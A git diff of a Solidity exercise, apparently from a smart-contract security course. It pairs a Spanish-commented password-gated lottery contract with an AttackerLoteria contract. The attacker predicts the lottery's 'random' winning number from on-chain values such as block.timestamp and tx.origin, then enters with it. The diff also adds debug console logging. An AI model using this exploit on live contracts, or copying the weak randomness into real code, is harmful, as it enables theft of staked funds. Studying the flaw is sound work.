@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.19;
 
+import "hardhat/console.sol";
 /**
  * El contrato LoteriaConPassword permite que las personas participen en una lotería
  * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
@@ -41,6 +42,7 @@ contract LoteriaConPassword {
         uint256 _numeroGanador
     ) public payable {
         require(msg.value == 1500, "Cantidad apuesta incorrecta");
+        console.log("FDSFDFS");
         require(
             uint256(keccak256(abi.encodePacked(password))) == FACTOR,
             "No es el hash correcto"
@@ -84,12 +86,12 @@ contract AttackerLoteria {
     } */
 
     function attack(address _sc) public payable {
-        ILoteriaConPassword loteria = ILoteriaConPassword(_sc);
+        LoteriaConPassword loteria = LoteriaConPassword(_sc);
         uint256 numRandom = uint256(
             keccak256(
                 abi.encodePacked(
-                    FACTOR,
-                    uint256(1500),
+                    loteria.FACTOR(),
+                    msg.value,
                     tx.origin,
                     block.timestamp,
                     address(this)
@@ -103,6 +105,7 @@ contract AttackerLoteria {
                 break;
             }
         }
+        //(bool success, ) = payable(_sc).call{value: 1500}(abi.encodeWithSignature("participarEnLoteria(uint8,uint256)", pass, numeroGanador));
         loteria.participarEnLoteria{value: 1500}(pass, numeroGanador);
 
         
